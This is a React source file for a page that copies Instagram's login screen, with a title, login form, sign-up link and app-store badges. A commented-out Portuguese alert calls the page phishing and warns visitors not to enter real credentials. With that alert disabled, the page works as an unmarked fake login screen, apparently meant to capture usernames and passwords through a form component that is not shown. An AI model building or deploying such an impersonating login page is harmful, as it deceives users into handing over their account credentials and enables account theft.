import { BsMicrosoft, BsGooglePlay } from "react-icons/bs";
import Formulario from '../../Components/Formulario';
import Funcao from '../../Components/FuncoesEntrrarEsqueceuAsenhaEcadastrar';
import Links from "../../Components/Links";
import Footer from "../../Components/Footer";
import img from "../../assets/img/imgCelular.png";
import style from "./PaginaLogin.module.css";
import { useState } from "react";

const PaginaLogin = () => {
    //   alert("Atenção! isso é um phishing, não coloque sua senha ou email verdadeiro. os dados salvos serão apagados em 1hr mas se você mesmo quiser apagar, o email e senha do banco de dados estará disponivel no readme do github marciomartins12 repositorio instagram")
    const [senhaErrada, setSenhaErrada]= useState(0);
    return (
        <section className={style.section}>
            <div className={style.pc}>
                <div>
                    <img src={img} alt="imagem celular" />
                </div>
                <div>
                    <div className={style.border}>
                        <h1 className={style.tituloInstagram}>Instagram</h1>
                        <Formulario   
                            senhaErrada={setSenhaErrada}
                        />
                        <div className={style.divOU}>
                            <div></div>
                            <span>OU</span>
                            <div></div>
                        </div>
                        <Funcao
                            senhaErrada={senhaErrada}
                        />
                    </div>
                    <div className={style.semConta}>
                        <h6>não tem uma conta? <a href="#">Cadastre-se</a></h6>
                    </div>

                    <div className={style.divAplicativos}>
                        <h4>Obtenha o aplicativo.</h4>
                        <div className={style.container}>
                            <div className={style.divItemAplicativos}>
                                <BsGooglePlay color="white" />
                                <div>
                                    <p>Disponivel no</p>
                                    <h4>Google Play</h4>
                                </div>
                            </div>
                            <div className={style.divItemAplicativos}>
                                <BsMicrosoft color="white" />
                                <div>
                                    <p>Baixe da</p>
                                    <h4>Microsoft</h4>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <Links />
            <Footer />
        </section>)
};
export default PaginaLogin;